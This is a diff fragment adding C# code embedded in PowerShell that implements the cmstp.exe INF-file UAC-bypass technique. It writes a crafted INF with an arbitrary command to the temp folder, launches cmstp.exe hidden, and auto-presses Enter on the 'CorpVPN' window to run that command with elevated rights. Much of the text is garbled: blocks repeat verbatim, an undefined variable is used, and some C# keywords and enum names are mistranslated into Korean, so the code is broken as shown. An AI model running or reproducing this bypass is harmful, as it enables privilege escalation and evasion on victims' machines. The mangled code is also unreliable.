@@ -152,6 +152,216 @@ ShortSvcName=""CorpVPN""
 
         ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
         startInfo.Arguments = "/au " + InfFile.ToString();
+        cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+
+
+[AllUSer_LDIDSection]
+""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
+
+
+[Strings]
+ServiceName=""CorpVPN""
+ShortSvcName=""CorpVPN""
+
+
+";
+    
+    [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)] 
+    static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd); 
+
+
+    [DllImport("user32.dll")]
+    static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+
+
+    [DllImport("user32.dll")]
+    static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
+
+
+
+
+    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
+
+
+    public static string SetInfFile(string CommandToExecute)
+    {
+        StringBuilder OutputFile = new StringBuilder();
+        OutputFile.Append("C:\\windows\\temp");
+        OutputFile.Append("\\");
+        OutputFile.Append(Path.GetRandomFileName().Split(Convert.ToChar("."))[0]);
+        OutputFile.Append(".inf");
+        StringBuilder newInfData = new StringBuilder(InfData);
+        newInfData.Replace("LINE", CommandToExecute);
+        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
+        return OutputFile.ToString();
+    }
+
+
+    public static bool Execute(string CommandToExecute)
+    {
+
+
+        const int WM_SYSKEYDOWN = 0x0100;
+        const int VK_RETURN = 0x0D;
+
+
+
+
+        StringBuilder InfFile = new StringBuilder();
+        InfFile.Append(SetInfFile(CommandToExecute));
+
+
+        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
+        startInfo.Arguments = "/au " + InfFile.ToString();
+        cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+    cmd.StartInfo.CreateNoWindow = true;
+        IntPtr dptr = Marshal.AllocHGlobal(1); 
+        ShellExecute(dptr, "", BinaryPath, startInfo.Arguments,  "", 0);
+
+
+        Thread.Sleep(5000);
+        IntPtr WindowToFind = FindWindow(null, "CorpVPN"); // Window Titel
+
+
+        PostMessage(WindowToFind, WM_SYSKEYDOWN, VK_RETURN, 0);        
+        return true;
+    }
+
+
+
+
+}
+"@
+
+
+function Execute {
+    try 
+    {
+     Add-Type -TypeDefinition @'
+namespace Win32
+{
+    //https:msdn.microsoft.com/en-us/library/windows/desktop/ms633548(v=vs.85).aspx
+    공개 정적 클래스 함수
+    {
+        [System.Runtime.InteropServices.DllImport("User32.dll", EntryPoint="ShowWindow")]
+        public static extern bool SW(System.IntPtr hWnd, Win32.SW nCmdShow);
+    }
+    공개 열거형 SW
+    {
+        숨기기 = 0,
+        SHOW_NORMAL = 1,
+        SHOW_MINIMIZED = 2,
+        최대화 = 3,
+        SHOW_MAXIMIZED = 3,
+        SHOW_NO_ACTIVE = 4,
+        표시 = 5,
+        최소화 = 6,
+        SHOW_MIN_NO_ACTIVE = 7,
+        SHOW_NA = 8,
+
+[AllUSer_LDIDSection]
+""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
+
+
+[Strings]
+ServiceName=""CorpVPN""
+ShortSvcName=""CorpVPN""
+
+
+";
+    
+    [DllImport("Shell32.dll", CharSet = CharSet.Auto, SetLastError = true)] 
+    static extern IntPtr ShellExecute(IntPtr hwnd, string lpOperation, string lpFile, string lpParameters, string lpDirectory, int nShowCmd); 
+
+
+    [DllImport("user32.dll")]
+    static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+
+
+    [DllImport("user32.dll")]
+    static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
+
+
+
+
+    public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
+
+
+    public static string SetInfFile(string CommandToExecute)
+    {
+        StringBuilder OutputFile = new StringBuilder();
+        OutputFile.Append("C:\\windows\\temp");
+        OutputFile.Append("\\");
+        OutputFile.Append(Path.GetRandomFileName().Split(Convert.ToChar("."))[0]);
+        OutputFile.Append(".inf");
+        StringBuilder newInfData = new StringBuilder(InfData);
+        newInfData.Replace("LINE", CommandToExecute);
+        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
+        return OutputFile.ToString();
+    }
+
+
+    public static bool Execute(string CommandToExecute)
+    {
+
+
+        const int WM_SYSKEYDOWN = 0x0100;
+        const int VK_RETURN = 0x0D;
+
+
+
+
+        StringBuilder InfFile = new StringBuilder();
+        InfFile.Append(SetInfFile(CommandToExecute));
+
+
+        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
+        startInfo.Arguments = "/au " + InfFile.ToString();
+        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+        startInfo.CreateNoWindow = true;
+        IntPtr dptr = Marshal.AllocHGlobal(1); 
+        ShellExecute(dptr, "", BinaryPath, startInfo.Arguments,  "", 0);
+
+
+        Thread.Sleep(5000);
+        IntPtr WindowToFind = FindWindow(null, "CorpVPN"); // Window Titel
+
+
+        PostMessage(WindowToFind, WM_SYSKEYDOWN, VK_RETURN, 0);        
+        return true;
+    }
+
+
+
+
+}
+"@
+
+
+function Execute {
+    try 
+    {
+     Add-Type -TypeDefinition @'
+namespace Win32
+{
+    //https:msdn.microsoft.com/en-us/library/windows/desktop/ms633548(v=vs.85).aspx
+    공개 정적 클래스 함수
+    {
+        [System.Runtime.InteropServices.DllImport("User32.dll", EntryPoint="ShowWindow")]
+        public static extern bool SW(System.IntPtr hWnd, Win32.SW nCmdShow);
+    }
+    공개 열거형 SW
+    {
+        숨기기 = 0,
+        SHOW_NORMAL = 1,
+        SHOW_MINIMIZED = 2,
+        최대화 = 3,
+        SHOW_MAXIMIZED = 3,
+        SHOW_NO_ACTIVE = 4,
+        표시 = 5,
+        최소화 = 6,
+        SHOW_MIN_NO_ACTIVE = 7,
+        SHOW_NA = 8,
         IntPtr dptr = Marshal.AllocHGlobal(1); 
         ShellExecute(dptr, "", BinaryPath, startInfo.Arguments,  "", 0);
 
